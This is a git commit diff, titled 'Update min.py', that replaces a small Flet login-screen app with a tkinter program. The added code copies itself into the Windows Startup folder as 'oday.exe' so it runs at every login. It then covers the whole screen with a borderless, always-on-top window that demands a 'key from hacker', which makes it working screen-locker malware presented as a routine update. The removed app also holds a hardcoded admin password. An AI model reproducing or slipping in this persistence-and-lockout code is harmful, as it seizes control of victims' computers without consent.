133debbac0270b6a66c8a757d6f5f88081ade783
Hassansalm <132700607+Hassansalm@users.noreply.github.com>
2026-03-31 01:02:09 +0300

    Update min.py

--- min.py
+++ min.py
@@ -1,96 +1,61 @@
-
-from flet  import *
-
-  #### main ######
-def main(page:Page):
-    page.title='hassan.salm program'
-    page.window.width = 400
-    page.window.height = 800
-    page.window.top = 15 
-    page.window.left = 950
-    page.vertical_alignment = "center"
-    page.horizontal_alignment =  "center"
-    page.bgcolor = Colors.BLUE
-
-  ###### end main ####
-
-  ###### appbar start ####
-    page.appbar = AppBar(
-        bgcolor = Colors.BLUE ,
-        title = Text("program" , color='black' ) ,
-        center_title=True , 
-        leading=Icon(Icons.HOME ) , 
-        leading_width= 50 , 
-        #### الاحداث او الايقونة ####
-        actions=[
-            IconButton(Icons.NOTIFICATIONS ,icon_color=Colors.AMBER) ,
-            PopupMenuButton( 
-                items=[
-                    PopupMenuItem(Text('الملف الشخصي' , size=14 ,weight=FontWeight.BOLD) ) ,
-                    PopupMenuItem(Text('اعدادات التطبيق' , size=14 ,weight=FontWeight.BOLD) ) ,
-                    PopupMenuItem() ,
-                    PopupMenuItem(Text('من نحن ' , size=14 ,weight=FontWeight.BOLD) ) ,
-                    PopupMenuItem(Text('اغلاق التطبيق' , size=14 ,weight=FontWeight.BOLD) ) ,
-                    
-                  
-                ]
-                
-            )
-
-        ]
-
-    )
-    ######appbar end #######
-
-    ##### التحقق####
-    def show(e):
-        v1 =en1.value 
-        v2= en2.value
+import tkinter as tk
+from tkinter import messagebox
+import os
+import sys
+import shutil
+import threading
 
 
-        if v1 == 'hassan' and v2 == 'MHMh5656' :
-          
-          alert1= AlertDialog(
-             title=Text("welcom admin" ,size=20 , color='green')
-         )
-          
-          page.overlay.append(alert1)
-          alert1.open=True
-          page.update()
-        else:
-           alert1 =AlertDialog(
-              title= Text('data error' , size=25 , color='red')
-           )
-           page.overlay.append(alert1)
-           alert1.open=True
-           page.update()
-             
-  
-    ###### tolsss ########
-    img = Image(src=f'123.jpg', width=180, height=200)
-    txt=Text("تسجيل الدخول " ,color='Black',size= 25)
-    en1 = TextField(label='Email(اسم المستخدم)' , icon=Icons.EMAIL)
-    en2 = TextField(label='password(كلمة المرور)' , icon=Icons.PASSWORD ,password=True , can_reveal_password=True)
-    btn = ElevatedButton('login - تسجيل الدخول' ,on_click=show)
+# تحديد مسار التطبيق
+path_app = os.path.abspath(sys.argv[0])
 
+# تحديد مجلد البداية في قائمة "ابدأ"
+run_start = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+name = os.path.join(run_start, "oday.exe")
 
-    page.add(img , 
-             txt ,
-             en1 , 
-             en2 , 
-             btn 
-             )
-    
-    ##### navigation bar #### 
-    page.navigation_bar = CupertinoNavigationBar(
-       bgcolor=Colors.BLUE,
-       inactive_color = Colors.BLACK, 
-       destinations=[
-          NavigationBarDestination(icon=Icons.CALL,label='call') ,
-          NavigationBarDestination(icon=Icons.CAMERA , label='camera') ,
-          NavigationBarDestination(icon=Icons.CONTACT_EMERGENCY , label='contact')
-       ]
-    )
-    page.update()
+# إذا لم يكن التطبيق موجودًا في المجلد، قم بنسخه
+if not os.path.exists(name):
+    shutil.copy(path_app, name)
 
-app(main)
+# دالة للخروج من التطبيق
+def exit_app():
+    root.destroy()
+
+# دالة للتحقق من المفتاح المدخل
+def clos(event=None):
+    key = "1234567"
+    if entry.get() == key:
+        exit_app()
+    else:
+        messagebox.showerror("Don't play with me", "The key is wrong")
+
+# إعداد واجهة المستخدم
+root = tk.Tk()
+
+# إخفاء إطار النافذة
+root.overrideredirect(True)
+root.attributes("-topmost", True)
+
+# إضافة النصوص والعناصر
+tk.Label(root, text="Enter the key from hacker:", bg="green", fg="black").pack()
+
+entry = tk.Entry(root, width=50, border=0)
+entry.pack(pady=20)
+
+b = tk.Button(root, text="Submit", command=clos)
+b.pack()
+
+root.config(background="green")
+root.resizable(False, False)
+
+# جعل نافذة التطبيق تغطي الشاشة بالكامل
+root.geometry(f"{root.winfo_screenwidth()}x{root.winfo_screenheight()}+0+0")
+root.title("Keno")
+
+tk.Label(root, text="hack@gmail.com", bg="green", fg="black").pack(pady=20)
+
+# استدعاء الدالة clos عند الضغط على Enter أو الزر Submit
+entry.bind("<Return>", clos)
+
+# تشغيل نافذة tkinter
+root.mainloop()
